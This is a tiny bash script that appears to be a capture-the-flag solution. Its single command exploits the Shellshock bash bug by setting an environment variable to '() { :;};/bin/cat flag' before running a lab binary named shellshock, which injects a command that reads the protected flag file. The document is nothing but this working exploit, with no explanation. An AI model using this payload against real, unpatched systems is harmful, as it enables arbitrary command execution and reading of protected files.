#!/bin/bash

cd /home/shellshock
env x='() { :;};/bin/cat flag' ./shellshock